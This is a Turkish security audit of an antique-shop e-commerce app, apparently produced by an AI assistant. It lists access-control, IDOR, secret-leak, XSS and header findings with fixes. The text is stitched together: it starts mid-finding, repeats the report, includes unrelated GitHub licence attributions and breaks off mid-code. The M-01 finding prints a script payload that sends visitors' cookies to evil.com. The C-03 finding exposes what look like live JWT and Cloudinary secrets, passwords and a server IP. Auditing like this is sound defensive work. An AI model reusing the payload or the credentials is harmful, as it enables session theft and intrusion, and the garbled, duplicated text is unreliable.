Birçok endpoint'te `sortBy` parametresi kullanıcıdan alınıp doğrudan `Sort.by(sortBy)` ile kullanılıyor. Beyaz liste doğrulaması yok. Spring Data JPA, bilinmeyen property'lerde genellikle `PropertyReferenceException` fırlatır ve bu sayede SQL injection riski düşüktür. Ancak hata mesajları entity yapısını ve alan isimlerini ifşa eder, ayrıca bazı edge case'lerde persistence provider davranışı öngörülemez olabilir.

**Kanıt / Sorunlu Kod Akışı:**
```java
Sort sort = direction.equalsIgnoreCase("desc")
    ? Sort.by(sortBy).descending()  // sortBy = kullanıcı girdisi, whitelist YOK
    : Sort.by(sortBy).ascending();
```

**İstismar Senaryosu:**
`?sortBy=passwordHash` gibi bir istek gönderildiğinde, User entity'deki gizli alanlar üzerinden sıralama yapılabilir ve timing/response farklılıklarıyla alan değerleri çıkarılabilir (blind information disclosure).

**Önerilen Düzeltme:**
```java
private static final Set<String> ALLOWED_SORT_FIELDS = Set.of("id", "title", "price", "createdAt");

String safeSortBy = ALLOWED_SORT_FIELDS.contains(sortBy) ? sortBy : "id";
Sort sort = Sort.by(safeSortBy);
```

---

### [H-04] JWT Logout'ta Server-Side Token İptali Yok

**Seviye:** 🟠 YÜKSEK
**OWASP:** A07:2021 — Identification and Authentication Failures
**Güven Düzeyi:** Yüksek
**Konum:** [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx#L73-L77) → `logout()`, Backend'de logout endpoint yok

**Açıklama:**
Logout işlemi sadece frontend tarafında localStorage'dan token'ları temizliyor. Backend'de:
1. Access token blacklist mekanizması yok — token süresi dolana kadar (30 dk) geçerli kalır
2. Refresh token server-side olarak silinmiyor — saldırgan tarafından ele geçirilmişse kullanılabilir
3. Logout API endpoint'i hiç bulunmuyor

**İstismar Senaryosu:**
Token XSS veya ağ dinleme ile ele geçirilirse, kullanıcı çıkış yapsa bile saldırgan 30 dakika boyunca hesabı kullanmaya devam eder. Refresh token ile de yeni access token alabilir.

**Önerilen Düzeltme:**
```java
@PostMapping("/logout")
public ResultData<String> logout(Authentication authentication) {
    User user = (User) authentication.getPrincipal();
    refreshTokenService.deleteByUserId(user.getId());
    return ResultHelper.success("Çıkış yapıldı.");
}
```
Ayrıca access token için kısa ömür (mevcut 30dk uygun) ve Redis tabanlı blacklist düşünülebilir.

---

### [M-01] Stored XSS Riski — Blog İçeriği Sanitize Edilmeden Render Ediliyor

**Seviye:** 🟡 ORTA
**OWASP:** A03:2021 — Injection (XSS)
**Güven Düzeyi:** Orta
**Konum:** [blog/\[slug\]/page.tsx](can-antika-frontend/app/blog/[slug]/page.tsx#L192) → `dangerouslySetInnerHTML`

**Açıklama:**
Blog yazısının `content` alanı backend'den geldiği gibi `dangerouslySetInnerHTML` ile render ediliyor. Backend'de de blog post oluşturma/güncelleme sırasında HTML sanitizasyonu yapılmıyor. Blog yazıları admin tarafından oluşturulsa da, admin hesabı ele geçirilirse veya güvenilmeyen bir editör blog yazdığında, saklanan XSS mümkündür.

**İstismar Senaryosu:**
Ele geçirilmiş admin hesabı üzerinden blog yazısına `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` enjekte edilir. Blogu ziyaret eden her kullanıcının JWT token'ı çalınır.

**Önerilen Düzeltme:**
Frontend'de DOMPurify gibi bir kütüphane ile HTML sanitize edin:
```tsx
import DOMPurify from 'dompurify';
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }}
```

---

### [M-02] Güvenlik Başlıkları (Security Headers) Eksik

**Seviye:** 🟡 ORTA
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [next.config.mjs](can-antika-frontend/next.config.mjs)

**Açıklama:**
Ne backend ne de frontend'te güvenlik başlıkları yapılandırılmış. Eksik başlıklar:
- **Content-Security-Policy** — XSS mitigasyonu
- **X-Frame-Options / frame-ancestors** — Clickjacking koruması
- **Strict-Transport-Security (HSTS)** — HTTPS zorlama
- **X-Content-Type-Options: nosniff** — MIME sniffing koruması
- **Referrer-Policy** — Bilgi sızıntısı önleme
- **Permissions-Policy** — Tarayıcı özellik kısıtlama

**Önerilen Düzeltme (Backend):**
```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; script-src 'self'"))
    .frameOptions(fo -> fo.deny())
    .httpStrictTransportSecurity(hsts -> hsts.maxAgeInSeconds(31536000).includeSubDomains(true))
    .contentTypeOptions(Customizer.withDefaults())
    .referrerPolicy(rp -> rp.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
);
```

**Önerilen Düzeltme (Frontend — next.config.mjs):**
```js
async headers() {
    return [{
        source: '/(.*)',
        headers: [
            { key: 'X-Frame-Options', value: 'DENY' },
            { key: 'X-Content-Type-Options', value: 'nosniff' },
            { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
        ],
    }];
}
```


## License: unknown
https://github.com/praveenjuge/praveenjuge/blob/f7c607592efe59257f18e3337868dd9519bec159/next.config.js

```
Now I have enough data to compile the full report. Let me organize everything.

---

# 🛡️ CAN ANTİKA — Uçtan Uca Güvenlik Denetim Raporu

---

## 1. İncelenen Dosya/Kod Alanlarının Kısa Özeti

**Backend (Spring Boot 3.2.2 / Java 17):**
- Security Config: [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [WebMvcConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/WebMvcConfig.java)
- JWT: [JwtService.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtService.java), [JwtAuthFilter.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtAuthFilter.java)
- Auth: [AuthService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/AuthService.java), [RefreshTokenService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/RefreshTokenService.java)
- Tüm Controller impl (27 adet), Service impl (32 adet), Repository (28 adet), Entity/Model (30 adet), DTO (65 adet)
- Exception Handler: [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java)
- Rate Limiting: [RateLimitFilter.java](e-commerce/src/main/java/com/mehmetkerem/config/RateLimitFilter.java)
- File Upload: [FileSystemStorageService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/FileSystemStorageService.java), [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java)
- Config: [application.properties](e-commerce/src/main/resources/application.properties), [docker-compose.yml](docker-compose.yml)

**Frontend (Next.js / React / TypeScript):**
- [api-client.ts](can-antika-frontend/lib/api-client.ts), [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx), [next.config.mjs](can-antika-frontend/next.config.mjs)
- Blog sayfası (`dangerouslySetInnerHTML` kullanımı)

---

## 2. Yönetici Özeti

| Seviye | Bulgu Sayısı |
|--------|--------------|
| 🔴 KRİTİK | 5 |
| 🟠 YÜKSEK | 4 |
| 🟡 ORTA | 5 |
| 🔵 DÜŞÜK | 3 |

**Sistemin Genel Risk Seviyesi: YÜKSEK**

### En Acil 5 Aksiyon:
1. **Kupon (Coupon) endpoint'lerine yetkilendirme ekle** — Herhangi bir oturum açmış kullanıcı kupon oluşturabiliyor/silebiliyor
2. **Fatura PDF endpoint'ine ownership kontrolü ekle** — IDOR ile herkesin faturası indirilebilir
3. **docker-compose.yml ve repo'daki secret'ları temizle** — JWT secret, Cloudinary API secret, DB şifresi ve admin JWT token'ı açık halde
4. **Kupon kullanım sayacının her `calculateTotal` çağrısında artmasını düzelt** — Business logic hatası
5. **GlobalExceptionHandler'daki catch-all'da `ex.getMessage()` yerine genel mesaj dön** — Internal hata mesajları client'a sızıyor

---

## 3. Bulgular

---

### [C-01] Kupon Endpoint'lerinde Yetkilendirme Eksikliği (Broken Function-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestCouponControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestCouponControllerImpl.java#L25-L44) → `createCoupon()`, `deleteCoupon()`, `applyCoupon()`

**Açıklama:**
`POST /v1/coupons/create`, `POST /v1/coupons/apply` ve `DELETE /v1/coupons/{id}` endpoint'lerinde `@Secured` veya `@PreAuthorize` anotasyonu **yok**. SecurityConfig'de bu path'ler `/v1/admin/**` altında olmadığından, `.anyRequest().authenticated()` kuralına düşüyor — oturum açmış **herhangi bir kullanıcı** bu işlemleri yapabiliyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// RestCouponControllerImpl.java — @Secured anotasyonu YOK
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(@RequestBody CouponRequest request) {
    return ResultHelper.success(couponService.createCoupon(request));
}

@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(@PathVariable Long id) {
    couponService.deleteCoupon(id);
    return ResultHelper.success("Kupon silindi.");
}
```

**İstismar Senaryosu:**
Normal bir kullanıcı, kendine %100 indirimli bir kupon oluşturur ve sepetine uygular. Tüm ürünleri 0 TL'ye satın alır. Mevcut kuponları da silebilir.

**Etkisi:** Finansal kayıp, iş mantığı ihlali, veri bütünlüğü kaybı.

**Önerilen Düzeltme:**
```java
@Secured("ROLE_ADMIN")
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(...) { ... }

@Secured("ROLE_ADMIN")
@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(...) { ... }
```

---

### [C-02] Fatura PDF İndirme'de IDOR (Broken Object-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L146-L155) → `downloadInvoicePdf()`

**Açıklama:**
`GET /v1/order/{orderId}/invoice/pdf` endpoint'inde **hiçbir yetkilendirme kontrolü yapılmıyor**. Aynı controller'daki `getOrderInvoice()` metodu doğru şekilde ownership kontrolü yaparken, PDF download metodu bu kontrolü **tamamen atlıyor**.

**Kanıt / Sorunlu Kod Akışı:**
```java
// ✅ JSON invoice — OwnerShip kontrolü VAR
@GetMapping("/{orderId}/invoice")
public ResultData<OrderInvoiceResponse> getOrderInvoice(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = ...;
    if (!isOwner && !isAdmin) throw ...;  // ✅ Doğru kontrol
}

// ❌ PDF invoice — Kontrol YOK
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);  // ❌ Direkt erişim
    return ResponseEntity.ok()...body(pdfBytes);
}
```

**İstismar Senaryosu:**
Saldırgan orderId'leri sırayla itereyerek (`/v1/order/1/invoice/pdf`, `/v1/order/2/invoice/pdf`, ...) tüm müşterilerin faturalarını (ad, adres, sipariş detayı) indirebilir.

**Etkisi:** Kişisel veri sızıntısı (PII), KVKK ihlali, müşteri bilgilerinin ifşası.

**Önerilen Düzeltme:**
```java
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    Long currentUserId = SecurityUtils.getCurrentUserId();
    if (currentUserId == null) throw new InsufficientAuthenticationException("Oturum gerekli");
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = SecurityUtils.getCurrentUser() != null
            && SecurityUtils.getCurrentUser().getRole() == Role.ADMIN;
    if (!isOwner && !isAdmin) throw new BadRequestException("Bu faturayı indirme yetkiniz yok.");
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);
    return ResponseEntity.ok()...body(pdfBytes);
}
```

---

### [C-03] Repo'da Hardcoded Secret'lar ve Yayınlanmış JWT Token

**Seviye:** 🔴 KRİTİK
**OWASP:** A02:2021 — Cryptographic Failures
**Güven Düzeyi:** Yüksek
**Konum:**
- [docker-compose.yml](docker-compose.yml#L47-L51)
- [application.properties](e-commerce/src/main/resources/application.properties#L32)
- [token.json](e-commerce/token.json)
- [api-client.ts](can-antika-frontend/lib/api-client.ts#L3-L4)

**Açıklama:**
Birden fazla hassas veri repo'ya commit'lenmiş durumda:

| Veri | Dosya | Değer |
|------|-------|-------|
| JWT Secret | docker-compose.yml | `b3c7f2e8a91d4f5069c8e12a7b6d3f4e5a9c1d0872e4f6a8b3c5d7e9f0a1b2c3` |
| Cloudinary API Secret | docker-compose.yml | `dnR2_CjaiLKnxjhw64vJpaSjYqE` |
| DB Password (default) | application.properties | `mehmet619` |
| Admin Password (default) | application.properties | `admin123` |
| Admin JWT Token | token.json | Tam bearer token |
| Sunucu IP'si | api-client.ts | `http://116.202.106.185:8085` |

**İstismar Senaryosu:**
Repo'ya erişimi olan (veya geçmişte erişimi olan) herhangi biri JWT secret ile sahte admin token'ları üretebilir, Cloudinary hesabını kötüye kullanabilir veya doğrudan veritabanına bağlanabilir.

**Etkisi:** Tam sistem ele geçirme, veri ihlali.

**Önerilen Düzeltme:**
1. Tüm secret'ları environment variable olarak dışarıdan verin
2. `docker-compose.yml`'de `.env` dosyası referans edin
3. `token.json` dosyasını silin ve `.gitignore`'a ekleyin
4. Mevcut JWT secret'ı ve Cloudinary secret'ı **hemen** rotate edin
5. Git geçmişini `git filter-branch` veya `BFG` ile temizleyin

---

### [C-04] Kupon Kullanım Sayacı Business Logic Hatası (Double-Spend)

**Seviye:** 🔴 KRİTİK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Yüksek
**Konum:** [CartServiceImpl.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/CartServiceImpl.java#L194-L203) → `calculateTotal()`

**Açıklama:**
`calculateTotal()` metodu sepet toplamını hesaplarken `couponService.applyCoupon()` çağırıyor. Bu metot, kuponun `usageCount`'unu **her çağrıda artırıyor**. Sipariş oluşturma akışında `calculateTotal()` çağrıldığında kupon kullanımı artıyor ama aslında sipariş henüz oluşmamış. Sepet her görüntülendiğinde kupon tükeniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// CartServiceImpl.calculateTotal()
public BigDecimal calculateTotal(Long userId) {
    Cart cart = getCartByUserId(userId);
    BigDecimal total = calculateRawTotal(cart);
    if (cart.getCouponCode() != null) {
        return couponService.applyCoupon(cart.getCouponCode(), total); // ❌ Her çağrıda usageCount++
    }
    return total;
}

// CouponServiceImpl.applyCoupon()
public BigDecimal applyCoupon(String code, BigDecimal cartTotal) {
    ...
    coupon.setUsageCount(coupon.getUsageCount() + 1); // ❌ Side effect
    couponRepository.save(coupon);
    ...
}
```

**İstismar Senaryosu:**
1. Saldırgan kupon uygulayıp sepet toplamını 500+ kez çağırarak kuponun kullanım limitini tüketir.
2. Meşru müşteriler kuponu kullanamaz.
3. Alternatif olarak `applyCoupon()` aynı anda iki kez çağrılırsa race condition ile limit aşılabilir (Coupon entity'de `@Version` var ama retry mekanizması yok).

**Etkisi:** Kupon manipülasyonu, iş mantığı ihlali, gelir kaybı.

**Önerilen Düzeltme:**
`calculateTotal()` içinde kupon indirimini **sadece hesapla, usage artırma**. Usage artırımını yalnızca `saveOrder()` akışında yap:
```java
// Yeni metot: sadece indirim hesabı, side-effect yok
public BigDecimal calculateDiscount(String code, BigDecimal cartTotal) {
    Coupon coupon = couponRepository.findByCode(code).orElseThrow(...);
    // Validate aktiflik, süre, limit... ama usageCount artırma
    return cartTotal.subtract(coupon.getDiscountAmount()).max(BigDecimal.ZERO);
}
```

---

### [C-05] Exception Handler'da Internal Bilgi Sızıntısı

**Seviye:** 🔴 KRİTİK
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java#L78-L83) → `handleGeneralException()`

**Açıklama:**
Catch-all exception handler'da `ex.getMessage()` doğrudan HTTP response'a yazılıyor. Beklenmeyen hatalar (NPE, JPA hataları, veritabanı bağlantı hataları vb.) durumunda internal class adları, SQL sorguları, stack trace parçaları ve tablo/kolon isimleri client'a sızar.

**Kanıt / Sorunlu Kod Akışı:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error(ex.getMessage(), HttpStatus.INTERNAL_SERVER_ERROR),  // ❌
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

**İstismar Senaryosu:**
Saldırgan, geçersiz girdi ile kasıtlı hatalar tetikler ve response'taki hata mesajlarından veritabanı şeması, tablo isimleri, framework detayları öğrenir; bu bilgiyi daha hedefli saldırılar için kullanır.

**Etkisi:** Bilgi sızıntısı, saldırı yüzeyinin genişlemesi.

**Önerilen Düzeltme:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error("Beklenmeyen bir hata oluştu. Lütfen daha sonra tekrar deneyin.",
            HttpStatus.INTERNAL_SERVER_ERROR),
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

---

### [H-01] Havale Bildirimi Endpoint'inde Authentication ve Validation Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestBankTransferControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestBankTransferControllerImpl.java#L49-L52) → `submitTransfer()`

**Açıklama:**
`POST /v1/bank-transfers` endpoint'i SecurityConfig'de `permitAll()` olarak tanımlı. Kimlik doğrulaması olmadan herhangi biri sahte havale bildirimi gönderebilir. `toEntity()` metodu request'ten gelen `orderId`, `amount`, `bankName`, `senderName` gibi alanları doğrudan entity'ye yazıyor; sipariş sahipliği veya tutarın doğruluğu kontrolü yapılmıyor.

**İstismar Senaryosu:**
Saldırgan başka birinin siparişi için sahte havale bildirimi gönderir. Admin bunu onaylarsa sipariş durumu otomatik olarak PAID'e güncellenir.

**Etkisi:** Ödeme sahteciliği, sipariş manipülasyonu.

**Önerilen Düzeltme:**
1. Endpoint'i authenticated yapın veya honeypot olarak bırakırsanız admin tarafında güçlü doğrulama ekleyin.
2. `submitTransfer()` içinde orderId'nin gerçekten mevcut ve PENDING durumda olduğunu, tutarın sipariş tutarıyla eşleştiğini kontrol edin.

---

### [H-02] Dosya Yükleme'de Content-Type Spoofing Riski

**Seviye:** 🟠 YÜKSEK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Orta
**Konum:** [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java#L65-L72) → `validateImage()`

**Açıklama:**
Dosya yükleme doğrulaması yalnızca `file.getContentType()` değerine bakıyor. Bu değer istemci tarafından kolaylıkla ayarlanabilir. Dosyanın gerçek içeriğini (magic bytes) doğrulamak için herhangi bir kontrol yok. Ayrıca dosya uzantısı üzerinde açık bir beyaz liste doğrulaması yapılmıyor — uzantı, orijinal dosya adından alınıp UUID'ye ekleniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
private void validateImage(MultipartFile file) {
    String contentType = file.getContentType();  // ❌ İstemci kontrollü
    if (contentType == null || !ALLOWED_CONTENT_TYPES.contains(contentType.toLowerCase())) {
        throw new BadRequestException("Sadece resim dosyaları yüklenebilir...");
    }
}
```

**İstismar Senaryosu:**
Saldırgan `Content-Type: image/jpeg` header'ı ile bir HTML veya SVG dosyası yükler. Dosya sunucuda saklanır ve doğrudan erişilirse tarayıcıda çalıştırılabilir (XSS).

**Önerilen Düzeltme:**
```java
private void validateImage(MultipartFile file) {
    // 1. Content-type kontrolü (mevcut)
    // 2. Uzantı beyaz listesi
    String ext = getExtension(file.getOriginalFilename()).toLowerCase();
    if (!Set.of(".jpg",".jpeg",".png",".gif",".webp").contains(ext)) {
        throw new BadRequestException("Geçersiz dosya uzantısı.");
    }
    // 3. Magic bytes kontrolü
    byte[] header = new byte[8];
    try (var is = file.getInputStream()) {
        is.read(header);
    }
    if (!isValidImageMagicBytes(header)) {
        throw new BadRequestException("Dosya içeriği geçerli bir resim değil.");
    }
}
```

---

### [H-03] sortBy Parametresinde Whitelist Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A03:2021 — Injection
**Güven Düzeyi:** Orta
**Konum:** Çoklu controller dosyası: [RestProductControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestProductControllerImpl.java#L78), [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L55)

**Açıklama:**
Birçok endpoint'te `sortBy` parametresi kullanıcıdan alınıp doğrudan `Sort.by(sortBy)` ile kullanılıyor. Beyaz liste doğrulaması yok. Spring Data JPA, bilinmeyen property'lerde genellikle `PropertyReferenceException` fırlatır ve bu sayede SQL injection riski düşüktür. Ancak hata mesajları entity yapısını ve alan isimlerini ifşa eder, ayrıca bazı edge case'lerde persistence provider davranışı öngörülemez olabilir.

**Kanıt / Sorunlu Kod Akışı:**
```java
Sort sort = direction.equalsIgnoreCase("desc")
    ? Sort.by(sortBy).descending()  // sortBy = kullanıcı girdisi, whitelist YOK
    : Sort.by(sortBy).ascending();
```

**İstismar Senaryosu:**
`?sortBy=passwordHash` gibi bir istek gönderildiğinde, User entity'deki gizli alanlar üzerinden sıralama yapılabilir ve timing/response farklılıklarıyla alan değerleri çıkarılabilir (blind information disclosure).

**Önerilen Düzeltme:**
```java
private static final Set<String> ALLOWED_SORT_FIELDS = Set.of("id", "title", "price", "createdAt");

String safeSortBy = ALLOWED_SORT_FIELDS.contains(sortBy) ? sortBy : "id";
Sort sort = Sort.by(safeSortBy);
```

---

### [H-04] JWT Logout'ta Server-Side Token İptali Yok

**Seviye:** 🟠 YÜKSEK
**OWASP:** A07:2021 — Identification and Authentication Failures
**Güven Düzeyi:** Yüksek
**Konum:** [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx#L73-L77) → `logout()`, Backend'de logout endpoint yok

**Açıklama:**
Logout işlemi sadece frontend tarafında localStorage'dan token'ları temizliyor. Backend'de:
1. Access token blacklist mekanizması yok — token süresi dolana kadar (30 dk) geçerli kalır
2. Refresh token server-side olarak silinmiyor — saldırgan tarafından ele geçirilmişse kullanılabilir
3. Logout API endpoint'i hiç bulunmuyor

**İstismar Senaryosu:**
Token XSS veya ağ dinleme ile ele geçirilirse, kullanıcı çıkış yapsa bile saldırgan 30 dakika boyunca hesabı kullanmaya devam eder. Refresh token ile de yeni access token alabilir.

**Önerilen Düzeltme:**
```java
@PostMapping("/logout")
public ResultData<String> logout(Authentication authentication) {
    User user = (User) authentication.getPrincipal();
    refreshTokenService.deleteByUserId(user.getId());
    return ResultHelper.success("Çıkış yapıldı.");
}
```
Ayrıca access token için kısa ömür (mevcut 30dk uygun) ve Redis tabanlı blacklist düşünülebilir.

---

### [M-01] Stored XSS Riski — Blog İçeriği Sanitize Edilmeden Render Ediliyor

**Seviye:** 🟡 ORTA
**OWASP:** A03:2021 — Injection (XSS)
**Güven Düzeyi:** Orta
**Konum:** [blog/\[slug\]/page.tsx](can-antika-frontend/app/blog/[slug]/page.tsx#L192) → `dangerouslySetInnerHTML`

**Açıklama:**
Blog yazısının `content` alanı backend'den geldiği gibi `dangerouslySetInnerHTML` ile render ediliyor. Backend'de de blog post oluşturma/güncelleme sırasında HTML sanitizasyonu yapılmıyor. Blog yazıları admin tarafından oluşturulsa da, admin hesabı ele geçirilirse veya güvenilmeyen bir editör blog yazdığında, saklanan XSS mümkündür.

**İstismar Senaryosu:**
Ele geçirilmiş admin hesabı üzerinden blog yazısına `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` enjekte edilir. Blogu ziyaret eden her kullanıcının JWT token'ı çalınır.

**Önerilen Düzeltme:**
Frontend'de DOMPurify gibi bir kütüphane ile HTML sanitize edin:
```tsx
import DOMPurify from 'dompurify';
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }}
```

---

### [M-02] Güvenlik Başlıkları (Security Headers) Eksik

**Seviye:** 🟡 ORTA
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [next.config.mjs](can-antika-frontend/next.config.mjs)

**Açıklama:**
Ne backend ne de frontend'te güvenlik başlıkları yapılandırılmış. Eksik başlıklar:
- **Content-Security-Policy** — XSS mitigasyonu
- **X-Frame-Options / frame-ancestors** — Clickjacking koruması
- **Strict-Transport-Security (HSTS)** — HTTPS zorlama
- **X-Content-Type-Options: nosniff** — MIME sniffing koruması
- **Referrer-Policy** — Bilgi sızıntısı önleme
- **Permissions-Policy** — Tarayıcı özellik kısıtlama

**Önerilen Düzeltme (Backend):**
```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; script-src 'self'"))
    .frameOptions(fo -> fo.deny())
    .httpStrictTransportSecurity(hsts -> hsts.maxAgeInSeconds(31536000).includeSubDomains(true))
    .contentTypeOptions(Customizer.withDefaults())
    .referrerPolicy(rp -> rp.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
);
```

**Önerilen Düzeltme (Frontend — next.config.mjs):**
```js
async headers() {
    return [{
        source: '/(.*)',
        headers: [
            { key: 'X-Frame-Options', value: 'DENY' },
            { key: 'X-Content-Type-Options', value: 'nosniff' },
            { key:
```


## License: unknown
https://github.com/Aviortheking/games/blob/392a5f75cb70d467a0e001317f6ed236c48123bc/dzeio.next.config.js

```
Now I have enough data to compile the full report. Let me organize everything.

---

# 🛡️ CAN ANTİKA — Uçtan Uca Güvenlik Denetim Raporu

---

## 1. İncelenen Dosya/Kod Alanlarının Kısa Özeti

**Backend (Spring Boot 3.2.2 / Java 17):**
- Security Config: [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [WebMvcConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/WebMvcConfig.java)
- JWT: [JwtService.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtService.java), [JwtAuthFilter.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtAuthFilter.java)
- Auth: [AuthService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/AuthService.java), [RefreshTokenService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/RefreshTokenService.java)
- Tüm Controller impl (27 adet), Service impl (32 adet), Repository (28 adet), Entity/Model (30 adet), DTO (65 adet)
- Exception Handler: [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java)
- Rate Limiting: [RateLimitFilter.java](e-commerce/src/main/java/com/mehmetkerem/config/RateLimitFilter.java)
- File Upload: [FileSystemStorageService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/FileSystemStorageService.java), [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java)
- Config: [application.properties](e-commerce/src/main/resources/application.properties), [docker-compose.yml](docker-compose.yml)

**Frontend (Next.js / React / TypeScript):**
- [api-client.ts](can-antika-frontend/lib/api-client.ts), [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx), [next.config.mjs](can-antika-frontend/next.config.mjs)
- Blog sayfası (`dangerouslySetInnerHTML` kullanımı)

---

## 2. Yönetici Özeti

| Seviye | Bulgu Sayısı |
|--------|--------------|
| 🔴 KRİTİK | 5 |
| 🟠 YÜKSEK | 4 |
| 🟡 ORTA | 5 |
| 🔵 DÜŞÜK | 3 |

**Sistemin Genel Risk Seviyesi: YÜKSEK**

### En Acil 5 Aksiyon:
1. **Kupon (Coupon) endpoint'lerine yetkilendirme ekle** — Herhangi bir oturum açmış kullanıcı kupon oluşturabiliyor/silebiliyor
2. **Fatura PDF endpoint'ine ownership kontrolü ekle** — IDOR ile herkesin faturası indirilebilir
3. **docker-compose.yml ve repo'daki secret'ları temizle** — JWT secret, Cloudinary API secret, DB şifresi ve admin JWT token'ı açık halde
4. **Kupon kullanım sayacının her `calculateTotal` çağrısında artmasını düzelt** — Business logic hatası
5. **GlobalExceptionHandler'daki catch-all'da `ex.getMessage()` yerine genel mesaj dön** — Internal hata mesajları client'a sızıyor

---

## 3. Bulgular

---

### [C-01] Kupon Endpoint'lerinde Yetkilendirme Eksikliği (Broken Function-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestCouponControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestCouponControllerImpl.java#L25-L44) → `createCoupon()`, `deleteCoupon()`, `applyCoupon()`

**Açıklama:**
`POST /v1/coupons/create`, `POST /v1/coupons/apply` ve `DELETE /v1/coupons/{id}` endpoint'lerinde `@Secured` veya `@PreAuthorize` anotasyonu **yok**. SecurityConfig'de bu path'ler `/v1/admin/**` altında olmadığından, `.anyRequest().authenticated()` kuralına düşüyor — oturum açmış **herhangi bir kullanıcı** bu işlemleri yapabiliyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// RestCouponControllerImpl.java — @Secured anotasyonu YOK
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(@RequestBody CouponRequest request) {
